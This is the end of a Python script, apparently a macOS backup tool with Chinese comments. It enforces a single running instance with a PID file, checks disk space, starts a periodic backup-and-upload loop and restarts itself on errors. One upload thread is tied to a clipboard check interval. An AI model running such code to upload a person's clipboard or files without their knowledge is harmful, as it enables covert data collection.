            time.sleep(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)
            
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.error(f"JTB上传线程错误: {e}")
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def main():
    """主函数"""
    pid_file = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.pid')
    try:
        # 检查是否已经有实例在运行
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                old_pid = int(f.read().strip())
                try:
                    os.kill(old_pid, 0)
                    print(f'备份程序已经在运行 (PID: {old_pid})')
                    return
                except OSError:
                    pass
        
        # 写入当前进程PID
        os.makedirs(os.path.dirname(pid_file), exist_ok=True)
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
            
        # 注意：日志配置在 BackupManager.__init__ 中进行，无需重复配置
        
        # 检查磁盘空间
        try:
            # 在 macOS 上直接使用备份根目录
            free_space = shutil.disk_usage(BackupConfig.BACKUP_ROOT).free
            if free_space < BackupConfig.MIN_FREE_SPACE:
                logging.warning(f'备份驱动器空间不足: {free_space / (1024*1024*1024):.2f}GB')
        except Exception as e:
            logging.warning(f'无法检查磁盘空间: {e}')
        
        # 创建备份管理器实例
        backup_manager = BackupManager()
        
        # 清理旧的备份目录
        clean_backup_directory()
        
        # 启动定期备份和上传
        periodic_backup_upload(backup_manager)
            
    except KeyboardInterrupt:
        logging.info('备份程序被用户中断')
    except Exception as e:
        logging.error(f'备份过程发生错误: {str(e)}')
        # 发生错误时等待一段时间后重试
        time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)
        main()  # 重新启动主程序
    finally:
        # 清理PID文件
        try:
            if os.path.exists(pid_file):
                os.remove(pid_file)
        except Exception as e:
            logging.error(f'清理PID文件失败: {str(e)}')

if __name__ == "__main__":
    main()
